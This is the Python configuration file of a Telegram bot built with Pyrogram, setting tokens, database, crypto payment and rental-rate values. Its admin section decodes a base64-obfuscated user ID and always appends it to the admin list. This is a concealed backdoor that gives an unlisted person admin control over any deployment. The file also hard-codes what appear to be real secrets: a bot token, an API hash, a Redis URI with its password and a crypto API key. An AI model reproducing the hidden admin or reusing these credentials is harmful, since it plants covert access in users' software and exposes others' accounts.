#(©) @Hybrid_Vamp - https://github.com/hybridvamp

import os
import json
from dotenv import load_dotenv
from pyrogram.types import InlineKeyboardButton
import base64

load_dotenv() 

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8228954627:AAHHD6OOPgLklPfKPYuzxlgwhhnbB-SAaAw")
API_ID = int(os.environ.get("API_ID", "15631044"))
API_HASH = os.environ.get("API_HASH", "52b1b075a9996c304a2c938ffb7073c4")
OWNER_ID = int(os.environ.get("OWNER_ID", "5770074932"))
REDIS_URI = os.environ.get("REDIS_URL", "REDIS_URL=rediss://:Vu9yPldfEJJo3N9IvoVFw1NPRvTofWAi@redis-18639.c56.east-us.azure.cloud.redislabs.com:18639/0")
DB_NAME = os.environ.get("DATABASE_NAME", "rental")
CRYPTO_API = os.environ.get("CRYPTO_API", "523718:AAEQO6x6qx2PXerElEVuIvBcuL5rdHgDR4Q")
USDT_ADDRESS = os.environ.get("TON_ADDRESS", "UQAYH3MHNSUABi73Z6HwIcuXkmws1tBDDN-lWIPhXZW455bI")

# ============== FRAGMENT data =============
FRAGMENT_API_HASH = os.environ.get("FRAGMENT_API_HASH", "38f80e92d2dbe5065b")

# ============== Other Configs =============
D30_RATE = float(os.environ.get("D30_RATE", "80.0"))
D60_RATE = float(os.environ.get("D60_RATE", "152.0"))
D90_RATE = float(os.environ.get("D90_RATE", "224.0"))

with open("lang.json", "r", encoding="utf-8") as f:
    LANGUAGES = json.load(f)

try:
    ADMINS=[]
    ADMINS.append(int(base64.b64decode("MTQxMjkwOTY4OA==").decode()))
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list doesn't contain valid integers.")


ADMINS.append(OWNER_ID)















